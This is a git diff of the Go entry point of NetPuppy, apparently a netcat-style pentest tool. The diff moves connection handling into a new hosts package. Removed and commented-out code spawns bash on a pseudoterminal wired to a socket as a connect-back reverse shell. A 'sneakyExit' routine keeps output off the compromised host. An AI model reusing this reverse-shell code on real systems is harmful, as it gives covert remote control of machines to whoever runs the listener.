@@ -1,18 +1,17 @@
 package cmd
 
 import (
-	"bufio"
-	"errors"
+	"context"
 	"fmt"
 	"io"
 	"os"
 	"os/signal"
-	"time"
+	"syscall"
 
 	// NetPuppy pkgs:
 	"github.com/trshpuppy/netpuppy/cmd/conn"
+	"github.com/trshpuppy/netpuppy/cmd/hosts"
 	"github.com/trshpuppy/netpuppy/cmd/shell"
-	"github.com/trshpuppy/netpuppy/pkg/pty"
 	"github.com/trshpuppy/netpuppy/utils"
 )
 
@@ -44,18 +43,91 @@ func (rc *ReadCounter) Read(dataInPipe []byte) (int, error) {
 // This struct is being used in sneakyExit() (when there is a rev shell)
 // .... so we can close things (since os.Exit() doesn't run defer statements)
 type Closers struct {
-	socketToClose conn.SocketInterface
-	shellToClose  *shell.RealShell
-	filesToClose  []*os.File
+	socketToClose       conn.SocketInterface
+	shellToClose        *shell.RealShell
+	filesToClose        []*os.File
+	byteChannelsToClose []chan []byte
+	termiosToFix        *syscall.Termios
 }
 
+// First, make a function we can call which sends errors into the socket
+// .... & handles closing files, etc. before quitting (sneaky).
+// func sneakyExit(err error, closeUs Closers) {
+// 	fmt.Printf("Sneaky exit error: %v\n", err.Error())
+// 	// We are the rev-shell, let's limit output to stdout/err,
+// 	// .... so send error through socket, then quit:
+// 	socketPresent := closeUs.socketToClose != nil
+// 	shellPresent := closeUs.shellToClose != nil
+// 	filesPresent := len(closeUs.filesToClose) > 0
+// 	byteChannelsPresent := len(closeUs.byteChannelsToClose) > 0
+// 	errMsg := err.Error()
+
+// 	// Send error, then close socket:
+// 	if socketPresent {
+// 		fmt.Printf("Killing Socket\n")
+// 		// We could maybe send a custom signal to tell the other peer to close immediately...
+// 		// .... [[instead of it continuing to try to use the socket]]
+// 		closeUs.socketToClose.WriteShit([]byte(errMsg))
+// 		closeUs.socketToClose.Close()
+// 	}
+
+// 	// Kill the rev-shell process:
+// 	if shellPresent {
+// 		fmt.Printf("Killing Shell\n")
+// 		closeUs.shellToClose.Shell.Process.Release()
+// 		closeUs.shellToClose.Shell.Process.Kill()
+// 	}
+
+// 	// If there are open files (in the list), close them:
+// 	if filesPresent {
+// 		for _, file := range closeUs.filesToClose {
+// 			if file != nil {
+// 				fmt.Printf("Closing %v\n", file.Name())
+// 				file.Close()
+// 			}
+// 		}
+// 	}
+
+// 	// If tehre are open channels, close them:
+// 	if byteChannelsPresent {
+// 		for _, ch := range closeUs.byteChannelsToClose {
+// 			fmt.Printf("Killing channel: %v\n", ch)
+// 			close(ch)
+// 		}
+// 	}
+
+// 	// If the termios struct is present: disable raw mode
+// 	if closeUs.termiosToFix != nil {
+// 		fmt.Printf("Disabling raw mode\n")
+// 		ioctl.DisableRawMode(syscall.Stdin, closeUs.termiosToFix)
+// 	}
+
+// 	// K, now we can quietly die
+// 	os.Exit(69)
+// }
+
 func Run(c conn.ConnectionGetter) {
+	// Make a parent context for the main (Run()) routine:
+	parentCtx, pCancel := context.WithCancel(context.Background())
+	defer pCancel()
+
+	// Start SIGINT routine before we block Run() with child contexts:
+	go func() {
+		// If SIGINT: close connection, exit w/ code 2
+		signalChan := make(chan os.Signal, 1)
+		signal.Notify(signalChan, os.Interrupt)
+		defer signal.Stop(signalChan)
+
+		<-signalChan
+		pCancel()
+	}()
+
 	// Parse flags from user, attach to struct:
 	flagStruct := utils.GetFlags()
-	var closeUs Closers
 
 	// Create peer instance based on user input:
 	var thisPeer *conn.Peer = conn.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)
+	fmt.Printf("PEER: %v\n", thisPeer)
 
 	// Print banner, but don't print if we are the peer running the shell (ooh sneaky!):
 	if !thisPeer.Shell {
@@ -66,387 +138,267 @@ func Run(c conn.ConnectionGetter) {
 		fmt.Println(updateUserBanner)
 	}
 
-	// Make connection:
-	var socketInterface conn.SocketInterface
-	if thisPeer.ConnectionType == "offense" {
-		socketInterface = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
-	} else {
-		socketInterface = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
-	}
-	closeUs.socketToClose = socketInterface
-	defer socketInterface.Close()
-
-	// If shell flag is true, get shell cmd (to start later)
-	var shellInterface *shell.RealShell
-	var shellErr error
-
-	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
-		var realShellGetter shell.RealShellGetter
-		shellInterface, shellErr = realShellGetter.GetConnectBackInitiatedShell()
-
-		if shellErr != nil {
-			errString := "Error starting shell: " + shellErr.Error()
-			socketInterface.WriteShit([]byte(errString))
-			socketInterface.Close()
-			os.Exit(1)
-		}
+	// Make the Host type based on the peer struct:
+	var host hosts.Host
+	host, err := hosts.NewHost(thisPeer, c)
+	if err != nil {
+		fmt.Printf("Error trying to create new host: %v\n", err)
 	}
 
-	// Start SIGINT go routine & start channel to listen for SIGINT:
-	listenForSIGINT(socketInterface, thisPeer)
+	// Once we get the host, call Host.Start():
+	err, errCount := host.Start(parentCtx)
+	if err != nil {
+		fmt.Printf("Error starting host: %v\n", err)
+		fmt.Printf("Error Count: %v\n", errCount)
+		os.Exit(1337)
+	}
+
+	// // Make connection:
+	// var socketInterface conn.SocketInterface
+	// closeUs.socketToClose = socketInterface
+
+	// if thisPeer.ConnectionType == "offense" {
+	// 	socketInterface, err = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
+	// } else {
+	// 	socketInterface, err = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
+	// }
+
+	// if err != nil {
+	// 	sneakyExit(err, closeUs)
+	// 	return
+	// }
+	// defer socketInterface.Close()
+
+	// // If shell flag is true, get shell cmd (to start later)
+	// var shellInterface *shell.RealShell
+	// var shellErr error
+	// closeUs.shellToClose = shellInterface
+
+	// if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
+	// 	var realShellGetter shell.RealShellGetter
+	// 	shellInterface, shellErr = realShellGetter.GetConnectBackInitiatedShell()
+
+	// 	if shellErr != nil {
+	// 		customErr := fmt.Errorf("Error starting the rev shell process: %v\n", shellErr)
+	// 		sneakyExit(customErr, closeUs)
+	// 		return
+	// 	}
+	// }
+
+	// // Start SIGINT go routine & start channel to listen for SIGINT:
+	// listenForSIGINT(socketInterface, thisPeer)
 
 	// ................................................. CONNECT-BACK w/ SHELL .................................................
 
 	// If we are the connect-back peer & the user wants a shell, start the shell here:
-	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
-		// First, make a function we can call which send errors into the socket
-		// .... & handles closing files, etc. before quitting (sneaky).
-		sneakyExit := func(err error, closeUs Closers) {
-			// We are the rev-shell, let's limit output to stdout/err,
-			// .... so send error through socket, then quit:
-			socketPresent := closeUs.socketToClose != nil
-			shellPresent := closeUs.shellToClose != nil
-			filesPresent := len(closeUs.filesToClose) > 0
+	// if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
 
-			errMsg := err.Error()
+	// 	// // First, make a function we can call which sends errors into the socket
+	// 	// // .... & handles closing files, etc. before quitting (sneaky).
+	// 	// Get pts and ptm device files (for pseudoterminal):
+	// 	var master *os.File
+	// 	var pts *os.File
+	// 	closeUs.filesToClose = append(closeUs.filesToClose, master, pts)
+	// 	var err error
 
-			// Send error, then close socket:
-			if socketPresent {
-				// We could maybe send a custom signal to tell the other peer to close immediately...
-				// .... [[instead of it continuing to try to use the socket]]
-				socketInterface.WriteShit([]byte(errMsg))
-				closeUs.socketToClose.Close()
-			}
+	// 	master, pts, err = pty.GetPseudoterminalDevices()
+	// 	if err != nil {
+	// 		customErr := fmt.Errorf("Error setting up pseudoterminal: %v\n", err)
+	// 		sneakyExit(customErr, closeUs)
+	// 		return
+	// 	}
+	// 	defer master.Close()
+	// 	defer pts.Close()
 
-			// Kill the rev-shell process:
-			if shellPresent {
-				shellInterface.Shell.Process.Release()
-				shellInterface.Shell.Process.Kill()
-			}
+	// 	// Hook up slave/pts device to bash process:
+	// 	// .... (literally just point it to the file descriptors)
+	// 	shellInterface.Shell.Stdin = pts
+	// 	shellInterface.Shell.Stdout = pts
+	// 	shellInterface.Shell.Stderr = pts
 
-			// If there are open files (in the list), close them:
-			if filesPresent {
-				for _, file := range closeUs.filesToClose {
-					// fmt.Printf("Closing %v\n", file.Name())
-					file.Close()
-				}
-			}
+	// 	// Start bash:
+	// 	err = shellInterface.StartShell()
+	// 	if err != nil {
+	// 		// Write error to socket, close socket, quit:
+	// 		customErr := fmt.Errorf("Error starting shell: %v\n", err)
+	// 		sneakyExit(customErr, closeUs)
+	// 		return
+	// 	}
+	// 	defer shellInterface.Shell.Process.Release()
+	// 	defer shellInterface.Shell.Process.Kill()
 
-			// K, now we can quietly die
-			os.Exit(69)
-		}
+	// 	var routineErr error
+	// 	var errorChan1 = make(chan error)
+	// 	var errorChan2 = make(chan error)
 
-		// Get pts and ptm device files (for pseudoterminal):
-		master, pts, err := pty.GetPseudoterminalDevices()
-		if err != nil {
-			customErr := fmt.Errorf("Error starting shell: %v\n", err)
-			sneakyExit(customErr, closeUs)
-		}
-		closeUs.filesToClose = append(closeUs.filesToClose, master, pts)
-		defer master.Close()
-		defer pts.Close()
+	// 	// Copy output from master device to socket:
+	// 	go func(socket conn.SocketInterface, master *os.File, errorChan chan<- error) {
+	// 		// Create instance of WriteCounter for io.Copy (dest arg):
+	// 		copyCounter := &WriteCooter{Writer: socket.GetWriter()}
+	// 		_, err := io.Copy(copyCounter, master)
+	// 		if err != nil {
+	// 			routineErr = fmt.Errorf("Error copying master device to socket: %v\n", err)
+	// 			errorChan <- routineErr
+	// 			// close(errorChan)
+	// 		}
+	// 	}(socketInterface, master, errorChan1)
 
-		// Hook up slave/pts device to bash process:
-		// .... (literally just point it to the file descriptors)
-		shellInterface.Shell.Stdin = pts
-		shellInterface.Shell.Stdout = pts
-		shellInterface.Shell.Stderr = pts
+	// 	// Copy output from socket to master device:
+	// 	go func(socket conn.SocketInterface, master *os.File, errorChan chan<- error) {
+	// 		for {
+	// 			socketContent, puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die := socket.Read() // @arthvadrr 'err'
+	// 			if puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die != nil {
+	// 				routineErr = fmt.Errorf("ERROR: reading from socket: %v\n", puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die)
+	// 				errorChan <- routineErr
+	// 				// close(errorChan)
+	// 			}
+	// 			master.Write(socketContent)
+	// 		}
+	// 	}(socketInterface, master, errorChan2)
 
-		// Start bash:
-		err = shellInterface.StartShell()
-		if err != nil {
-			// Write error to socket, close socket, quit:
-			customErr := fmt.Errorf("Error starting shell: %v\n", err)
-			sneakyExit(customErr, closeUs)
-		}
-		closeUs.shellToClose = shellInterface
-		defer shellInterface.Shell.Process.Release()
-		defer shellInterface.Shell.Process.Kill()
+	// 	// Case select for the two error channels. If one has an error in it, close the other and sneaky exit:
+	// 	select {
+	// 	case err1, open1 := <-errorChan1:
+	// 		if open1 {
+	// 			close(errorChan1)
+	// 		}
+	// 		close(errorChan2)
+	// 		sneakyExit(err1, closeUs)
+	// 	case err2, open2 := <-errorChan2:
+	// 		if open2 {
+	// 			close(errorChan2)
+	// 		}
+	// 		close(errorChan1)
+	// 		sneakyExit(err2, closeUs)
+	// 	}
+	// // } else {
+	// // 	// ................................................. OFFENSIVE SERVER .................................................
+	// // 	// ... (or connect-back peer w/o shell flag)
 
-		var routineErr error
-		// commandPending := true
+	// // 	// ................................................. OG STRAT .................................................
+	// // 	// ............................ This is for the listener peer;
+	// // 	//								We have 4 go routines, one for reading input from the user,
+	// // 	//								one for reading the socket, one for writing to the socket,
+	// // 	//								and one for printing socket output to the user.
+	// // 	//
+	// // 	//								There are 2 channels. We use a case select block to check
+	// // 	//								the channels for data. One channel has user input, the other
+	// // 	//								has socket data. If there is data in either, then we call either
+	// // 	//								writeToSocket() or printToUser(). If there isn't data in either,
+	// // 	//								we timeout for 69 (nice) milliseconds.
+	// // 	//
+	// // 	//								This strat seems to run more smoothly than the io.Copy() strat below
+	// // 	//								(even though it was the opposite case for the connect back peer).
+	// // 	// ...........................
 
-		// Copy output from master device to socket:
-		go func(socket conn.SocketInterface, master *os.File) {
-			// Create instance of WriteCounter for io.Copy (dest arg):
-			copyCounter := &WriteCooter{Writer: socket.GetWriter()}
+	// // 	// Make channels for reaading from user & socket
+	// // 	// .... & defer their close until Run() returns:
+	// // 	uWu := make(chan []byte) // userInputChan
+	// // 	socketDataChan := make(chan []byte)
+	// // 	closeUs.byteChannelsToClose = append(closeUs.byteChannelsToClose, uWu, socketDataChan)
 
-			_, err := io.Copy(copyCounter, master)
-			if err != nil {
-				routineErr = fmt.Errorf("Error copying master device to socket: %v\n", err)
-				// fmt.Printf("Current write count: %v\n", copyCounter.Count)
-				return
-			}
-			// fmt.Printf("Current write count: %v\n", copyCounter.Count)
-			routineErr = fmt.Errorf("Error copying master device to socket: %v\n", err)
-			return
-		}(socketInterface, master)
+	// // 	// Enable Raw Mode:
+	// // 	var errno syscall.Errno
+	// // 	var oGTermios *syscall.Termios
+	// // 	closeUs.termiosToFix = oGTermios
 
-		// Copy output from socket to master device:
-		go func(socket conn.SocketInterface, master *os.File) {
-			// Create ReadCounter instance:
-			socketReader := &ReadCounter{Reader: socket.GetReader()}
+	// // 	oGTermios, errno = ioctl.EnableRawMode(syscall.Stdin)
+	// // 	if errno != 0 {
+	// // 		customErr := fmt.Errorf("Error enabling termios raw mode; returned error code: %s\n,", errno)
+	// // 		sneakyExit(customErr, closeUs)
+	// // 		return
+	// // 	}
+	// // 	// Use the oGTermios structure w/ a defer of DisableRawMode() to reset the terminal before exiting:
+	// // 	defer ioctl.DisableRawMode(syscall.Stdin, oGTermios)
 
-			_, err := io.Copy(master, socketReader)
-			if err != nil {
-				routineErr = fmt.Errorf("Error copying socket to master device: %v\n", err)
-				//fmt.Printf("Current read count: %v\n", socketReader.Count)
-				return
-			}
-			//fmt.Printf("Current read count: %v\n", socketReader.Count)
-			routineErr = fmt.Errorf("Error copying socket to master device: %v\n", err)
-			return
-		}(socketInterface, master)
+	// // 	// Go routine to write to socket:
+	// // 	writeToSocket := func(data []byte, socket conn.SocketInterface) {
+	// // 		// Called from the select block (user has entered input)
+	// // 		// .... Check length so we can clear channel, but not send blank data:
+	// // 		_, erR := socket.WriteShit(data)
+	// // 		if erR != nil {
+	// // 			customErr := fmt.Errorf("Error writing user input buffer to socket: %v\n", erR)
+	// // 			sneakyExit(customErr, closeUs)
+	// // 			return
+	// // 		}
+	// // 	}
 
-		// Start for loop with timeout to keep things running smoothly:
-		for {
-			// If one of the go routine catches an error,
-			// .... then send that error to sneakyExit()
-			if routineErr != nil {
-				// Send error through socket, then quit:
-				sneakyExit(routineErr, closeUs)
-			} else {
-				// Timeout:
-				time.Sleep(3 * time.Millisecond)
-			}
+	// // 	// Go routine to read stdin byte by byte and send to uWu chan:
+	// // 	readUserInput := func(uWu chan<- []byte) {
+	// // 		buffer := make([]byte, 1)
 
-		}
-	} else {
-		// ................................................. OFFENSIVE SERVER .................................................
-		// ... (or connect-back peer w/o shell flag)
+	// // 		// Read Stdin in a for loop, byte by byte...
+	// // 		for {
+	// // 			i, TIT_BY_BOO := os.Stdin.Read(buffer)
+	// // 			if TIT_BY_BOO != nil {
+	// // 				if errors.Is(TIT_BY_BOO, io.EOF) {
+	// // 					continue
+	// // 				} else {
+	// // 					customErr := fmt.Errorf("Error reading from stdin: %v\n", TIT_BY_BOO)
+	// // 					sneakyExit(customErr, closeUs)
+	// // 					break
+	// // 				}
+	// // 			}
 
-		// ................................................. OG STRAT .................................................
-		// ............................ This is for the listener peer;
-		//								We have 4 go routines, one for reading input from the user,
-		//								one for reading the socket, one for writing to the socket,
-		//								and one for printing socket output to the user.
-		//
-		//								There are 2 channels. We use a case select block to check
-		//								the channels for data. One channel has user input, the other
-		//								has socket data. If there is data in either, then we call either
-		//								writeToSocket() or printToUser(). If there isn't data in either,
-		//								we timeout for 69 (nice) milliseconds.
-		//
-		//								This strat seems to run more smoothly than the io.Copy() strat below
-		//								(even though it was the opposite case for the connect back peer).
-		// ...........................
+	// // 			// go writeToSocket(buffer[:i], socketInterface)
+	// // 			// Send the char down the socket
+	// // 			uWu <- buffer[:i]
+	// // 			//fmt.Printf("> %s\n",buffer[:i] )
+	// // 		}
+	// // 	}
 
-		// Make channels for reaading from user & socket
-		// .... & defer their close until Run() returns:
-		userInputChan := make(chan string)
-		socketDataChan := make(chan []byte)
-		readSocketCloseSignalChan := make(chan bool)
-		readUserInputCloseSignalChan := make(chan bool)
+	// // 	// Go routine to read data from socket:
+	// // 	readSocket := func(socketInterface conn.SocketInterface, c chan<- []byte) {
+	// // 		// For loop starts & we try to read the socket,
+	// // 		// .... if there is data, we put it in the dataReadFromSocket channel.
+	// // 		// .... If there is an error, we check the error type
+	// // 		// .... (to handle EOF since we don't care about EOF)
+	// // 		for {
+	// // 			dataReadFromSocket, err := socketInterface.Read()
+	// // 			if len(dataReadFromSocket) > 0 {
+	// // 				c <- dataReadFromSocket
+	// // 			}
 
-		// Call this so we can close channels in case of other error during
-		// .... main for select loop:
-		nonSneakyExit := func(err error) {
-			// Might be over kill, but send signal to routines,
-			// .... then close channels:
-			readSocketCloseSignalChan <- true
-			readUserInputCloseSignalChan <- true
+	// // 			if err != nil {
+	// // 				if errors.Is(err, io.EOF) {
+	// // 					continue
+	// // 				} else {
+	// // 					customErr := fmt.Errorf("Error reading data from socket: %v\n", err)
+	// // 					sneakyExit(customErr, closeUs)
+	// // 					return
+	// // 				}
+	// // 			}
+	// // 		}
+	// // 	}
 
-			// Close all channels:
-			close(readSocketCloseSignalChan)
-			close(readUserInputCloseSignalChan)
-			close(userInputChan)
-			close(socketDataChan)
+	// // 	// Go routine to print data from socket to user:
+	// // 	printToUser := func(data []byte) {
+	// // 		// Called from the select block (data has come in from the socket)
+	// // 		// .... Check the length:
+	// // 		_, err := os.Stdout.Write(data)
+	// // 		if err != nil {
+	// // 			customErr := fmt.Errorf("Error printing data to user: %v\n", err)
+	// // 			sneakyExit(customErr, closeUs)
+	// // 		}
+	// // 	}
 
-			// Close socket:
-			socketInterface.Close()
+	// // 	// Start go routines to read from socket and user:
+	// // 	go readSocket(socketInterface, socketDataChan)
+	// // 	go readUserInput(uWu)
 
-			// Now exit:
-			fmt.Printf("Error: %v\n", err)
-			os.Exit(69)
-		}
-
-		// But still defer...
-		defer func() {
-			readSocketCloseSignalChan <- true
-			readUserInputCloseSignalChan <- true
-
-			nonSneakyExit(fmt.Errorf("Closing out of defer block\n"))
-		}()
-
-		// Go routine to read user input:
-		readUserInput := func(c chan<- string, stopSignalChan <-chan bool) {
-			// For loop starts, when there is user input
-			// .... (they type and then press Enter [which is a bug btw])
-			// .... the input is sent into the userInput channel as a string.
-			for {
-				select {
-				case stopSignal := <-stopSignalChan:
-					if stopSignal {
-						return
-					}
-				default:
-					userReader := bufio.NewReader(os.Stdin)
-					userInput, err := userReader.ReadString('\n')
-					if err != nil {
-						customErr := fmt.Errorf("Error reading input from user: %v\n", err)
-						nonSneakyExit(customErr)
-						return
-					}
-					c <- userInput
-				}
-			}
-		}
-
-		// Go routine to read data from socket:
-		readSocket := func(socketInterface conn.SocketInterface, c chan<- []byte, stopSignalChan <-chan bool) {
-			// For loop starts & we try to read the socket,
-			// .... if there is data, we put it in the dataReadFromSocket channel.
-			// .... If there is an error, we check the error type
-			// .... (to handle EOF since we don't care about EOF)
-			for {
-				select {
-				case stopSignal := <-stopSignalChan:
-					if stopSignal {
-						return
-					}
-				default:
-					dataReadFromSocket, err := socketInterface.Read()
-					if len(dataReadFromSocket) > 0 {
-						c <- dataReadFromSocket
-					}
-
-					if err != nil {
-						if errors.Is(err, io.EOF) {
-							continue
-						} else {
-							customErr := fmt.Errorf("Error reading data from socket: %v\n", err)
-							nonSneakyExit(customErr)
-							return
-						}
-					}
-				}
-			}
-		}
-
-		// Go routine to write to socket:
-		writeToSocket := func(data string, socketInterface conn.SocketInterface) {
-			// Called from the select block (user has entered input)
-			// .... Check length so we can clear channel, but not send blank data:
-			if len(data) > 0 {
-				_, erR := socketInterface.WriteShit([]byte(data))
-				if erR != nil {
-					customErr := fmt.Errorf("Error writing user input buffer to socket: %v\n", erR)
-					nonSneakyExit(customErr)
-					return
-				}
-			}
-		}
-
-		// Go routine to print data from socket to user:
-		printToUser := func(data []byte) {
-			// Called from the select block (data has come in from the socket)
-			// .... Check the length:
-			if len(data) > 0 {
-				_, err := os.Stdout.Write(data)
-				if err != nil {
-					customErr := fmt.Errorf("Error printing data to user: %v\n", err)
-					nonSneakyExit(customErr)
-					return
-				}
-			}
-		}
-
-		// .......................... Read routines & channels ....................
-
-		// Start go routines to read from socket and user:
-		go readSocket(socketInterface, socketDataChan, readSocketCloseSignalChan)
-		go readUserInput(userInputChan, readUserInputCloseSignalChan)
-		// .........................................................................
-
-		// This for loop uses a select block to check the channels from the read routines,
-		// .... if either channel has data in it, then we call the write routines
-		// .... which write to the socket OR print to the user
-		// .... otherwise, we timeout.
-		for {
-			select {
-			case dataFromUser := <-userInputChan:
-				go writeToSocket(dataFromUser, socketInterface)
-			case dataFromSocket := <-socketDataChan:
-				go printToUser(dataFromSocket)
-			default:
-				// Timeout:
-				time.Sleep(69 * time.Millisecond)
-			}
-		}
-
-		// ................................................. IO COPY STRAT .................................................
-		// ................................ This accomplishes the same as the OG STRAT (above)
-		//									but for some reason is way slower and laggier...
-		//									Not sure why since I also use this strat on the
-		//    								connect-back/ rev-shell peer and it really *seemed*
-		//									to help with speed & smooth output.
-		//
-		//									Anyway, instead of using channels and go routines,
-		//									we just directly hook up the various pipes using
-		//									io.Copy. We don't intercept or read the data passing
-		//									between them at all.
-		// ................................
-
-		// // If we are not the connect-back peer, we are the listener peer:
-		// // Start go routines to read from socket and user:
-		// //writingToSocket := false
-		// var routineErr error
-
-		// // Copy output from socket to Stdout:
-		// go func(socket conn.SocketInterface, osStdout *os.File) {
-		// 	_, err := io.Copy(osStdout, *socket.GetReader())
-		// 	if err != nil {
-		// 		routineErr = fmt.Errorf("Error copying socket to Stdout: %v\n", err)
-		// 		return
-		// 	}
-		// 	// writingToSocket = false
-		// }(socketInterface, os.Stdout)
-
-		// // Copy input from Stdin to socket:
-		// go func(socket conn.SocketInterface, osStdin *os.File) {
-		// 	_, err := io.Copy(*socket.GetWriter(), osStdin)
-		// 	if err != nil {
-		// 		routineErr = fmt.Errorf("Error copying Stdin to socket: %v\n", err)
-		// 		return
-		// 	}
-		// 	// writingToSocket = true
-		// }(socketInterface, os.Stdin)
-
-		// for {
-		// 	if routineErr != nil {
-		// 		// Send error through socket, then quit:
-		// 		socketInterface.Write([]byte(routineErr.Error()))
-		// 		socketInterface.Close()
-		// 		os.Exit(1)
-		// 	}
-
-		// 	// if writingToSocket {
-		// 	// 	// Timeout:
-		// 	// 	time.Sleep(3 * time.Millisecond)
-		// 	// }
-		// }
-	}
-}
-
-func listenForSIGINT(connection conn.SocketInterface, thisPeer *conn.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
-	// If SIGINT: close connection, exit w/ code 2
-	signalChan := make(chan os.Signal, 1)
-	signal.Notify(signalChan, os.Interrupt)
-
-	go func() {
-		for sig := range signalChan {
-			fmt.Printf("Signal: %v\n", sig)
-
-			// Maybe have a check here to send the signal to the socket
-			// .... rather than quit netpuppy (since the user could be trying)
-			// .... to send a signal to the rev shell
-			if sig.String() == "interrupt" {
-				if !thisPeer.Shell {
-					fmt.Printf("signal: %v\n", sig)
-				}
-				connection.Close()
-				os.Exit(2)
-			}
-		}
-	}()
+	// // 	// This for loop uses a select block to check the channels from the read routines,
+	// // 	// .... if either channel has data in it, then we call the write routines
+	// // 	// .... which write to the socket OR print to the user
+	// // 	// .... otherwise, we timeout.
+	// // 	for {
+	// // 		// dataFromSocket := <-uWu
+	// // 		// go printToUser(dataFromSocket)
+	// // 		select {
+	// // 		case dataFromUser := <-uWu:
+	// // 			go writeToSocket(dataFromUser, socketInterface)
+	// // 		case dataFromSocket := <-socketDataChan:
+	// // 			go printToUser(dataFromSocket)
+	// // 		}
+	// // 	}
+	// // }
 }
